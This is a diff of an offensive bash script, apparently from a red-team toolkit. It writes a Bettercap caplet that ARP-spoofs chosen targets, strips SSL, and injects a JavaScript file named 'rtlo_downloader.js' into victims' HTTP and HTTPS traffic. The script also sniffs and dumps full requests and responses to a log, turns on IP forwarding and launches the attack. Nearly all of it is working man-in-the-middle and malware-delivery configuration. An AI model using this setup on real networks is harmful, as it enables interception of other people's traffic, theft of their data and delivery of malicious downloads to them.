@@ -204,24 +204,29 @@ EOF
 # --- GENERATE BETTERCAP CAPLET ---
 # ========================
 cat > "$MITM_DIR/cert_injector.cap" <<EOF
-# --- Enable ARP spoofing ---
-arp.spoof on
-
 # --- Enable HTTP and HTTPS proxies ---
 http.proxy on
 https.proxy on
 
 # --- Inject JS into HTTP and HTTPS traffic ---
-set http.proxy.injectjs.file $MITM_DIR/rtlo_downloader.js
-set https.proxy.injectjs.file $MITM_DIR/rtlo_downloader.js
+set http.proxy.sslstrip true
+set https.proxy.sslstrip true
+set http.proxy.injectjs $MITM_DIR/rtlo_downloader.js
+set https.proxy.injectjs $MITM_DIR/rtlo_downloader.js
 
 # --- Network sniffing ---
 net.sniff on
+net.probe on
+
+# --- Enable ARP spoofing ---
+set arp.spoof.targets $TARGETS
+arp.spoof on
 
 # --- Log sniffed traffic ---
 events.stream on
-events.stream.output /tmp/mitm.log
-events.stream.filter "http.request or http.response"
+set events.stream.output /tmp/mitm.log
+set events.stream.http.request.dump true
+set events.stream.http.response.dump true
 EOF
 chmod +x "$MITM_DIR/cert_injector.cap"
 
@@ -235,7 +240,8 @@ service apache2 restart
 # --- LAUNCH BETTERCAP ---
 # ========================
 color_print GREEN "[*] Launching Bettercap..."
-bettercap -iface "$IFACE" -eval "set arp.spoof.targets $TARGETS;caplets.update;unk9vvn/cert_injector"
+echo 1 | tee /proc/sys/net/ipv4/ip_forward
+bettercap -iface "$IFACE" -eval "unk9vvn/cert_injector"
 ```
 
 _Run & Execute_
